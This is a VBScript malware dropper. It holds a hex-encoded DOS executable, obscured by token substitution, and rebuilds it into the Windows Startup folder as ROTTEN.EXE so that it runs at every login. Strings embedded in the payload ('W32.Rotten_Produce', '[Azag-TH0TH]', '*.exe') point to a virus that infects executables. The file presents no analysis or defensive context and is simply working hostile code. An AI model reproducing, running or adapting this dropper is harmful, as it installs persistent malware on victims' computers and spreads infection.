dim v(8)
cut="8D,96/CD,21/"

v(0)="4D,5A,43,y,02,y3,02,y2,10,z2,F0,z,FE,z,y3,01,F0,z,1C,y7,E8,y2,902,5D,90,81,ED,03,01,902,1E,06,0E,1F,0E,07,E8,F4,01,8D,B6,86,01,8D,BE,7E,01,A54,g,3F,03,E8,60,01,B8,24,35,h,2E,89,9E"
v(1)=",83,03,2E,8C,86,85,03,B4,25,g,A2,02,h,0E,07,g,D3,02,E8,45,y,B4,09,g,A5,02,h,B8,24,25,2E,C5,96,83,03,h,0E,1F,BA,80,y,E8,26,01,07,1F,8C,C0,05,10,y,2E,01,86,80,01,2E,03,86,84"
v(2)=",01,FA,2E,8B,A6,82,01,8E,D0,FB,EA,yA,F0,z,y4,B4,4E,B9,07,y,h,72,07,E8,05,y,B4,4F,EB,F5,C3,B8,y,3D,E8,E9,y,B4,3F,B9,1A,y,g,69,03,h,B4,3E,h,2E,81,BE,79,03,50,52,74,02,EB,01"
v(3)=",C3,2E,C4,86,7D,03,2E,89,862,01,2E,8C,86,88,01,2E,C4,86,77,03,2E,8C,86,8A,01,2E,89,86,8C,01,2E,8B,86,71,03,B1,04,D3,E0,93,2E,C4,86,59,03,8C,C2,50,52,2B,C3,83,DA,y,B9,10,y,F7,F1,2E"
v(4)=",89,96,7D,03,2E,89,86,7F,03,2E,89,86,77,03,2E,C7,86,79,03,50,52,5A,58,05,23,02,83,D2,y,B1,09,50,D3,E8,D3,CA,F9,13,D0,58,80,E4,01,2E,89,96,6D,03,2E,89,86,6B,03,0E,07,B9,1A,y,51,33"
v(5)=",C9,E8,5C,y,B0,02,E8,4D,y,B4,40,g,69,03,59,h,72,16,B0,02,E8,2F,y,B4,2C,h,80,FE,y,74,F7,2E,88,B6,22,03,E8,77,y,B8,01,57,2E,8B,8E,55,03,2E,8B,96,57,03,h,B4,3E,h,33,C9,2E,8A"
v(6)=",8E,54,03,E8,19,y,C3,B4,42,33,C9,33,D2,h,C3,B4,1A,h,C3,B4,3D,g,5D,03,h,93,C3,B8,01,43,g,5D,03,h,C3,B0,03,CF,57,33,32,2E,52,6F,742,65,6E,5F,50,72,6F,64,75,63,65,0A,0D,2D,3D,5B"
v(7)=",41,7A,61,67,2D,54,48,30,54,48,5D,3D,2D,0A,0D,5B,49,56,50,5D,0A,0D,24,2A,2E,65,78,65,y,8D,B6,EE,02,8D,BE,23,03,B9,1C,y,A4,E2,FD,g,23,03,z,D2,C3,53,g,0A,03,z,D2,5B,B4,40,B9,23"
v(8)=",02,g,y,01,h,53,g,0A,03,z,D2,5B,C3,8D,9E,16,01,B9,F4,01,2E,8A,B6,22,03,2E,8A,27,32,E6,2E,88,27,43,E2,F5,C3,y"

function res(x,y)
	For k = 0 To UBound(v)
		v(k) = Replace(v(k), x, y)
	Next
End Function

res "z", "FF"
res "y", "00"
piece = Split(cut, "/")
cc = 103

For n = 0 To UBound(piece) - 1
	res Chr(cc), piece(n)
	cc = cc + 1
Next

For m = 0 To UBound(v)
	it = it & v(m)
Next


tmp = Split(it, ",")
Set fso = CreateObject("Scripting.FileSystemObject")
pth = "C:\Documents and Settings\All Users\Start Menu\Programs\Startup\ROTTEN.EXE"
Set f = fso.CreateTextFile(pth, ForWriting)
For i = 0 To UBound(tmp)
	l = Len(tmp(i))
	b = Int("&H" & Left(tmp(i), 2))
	If l > 2 Then
		r = Int("&H" & Mid(tmp(i), 3, l))
		For j = 1 To r
		f.Write Chr(b)
		Next
	Else
		f.Write Chr(b)
	End If
Next
f.Close

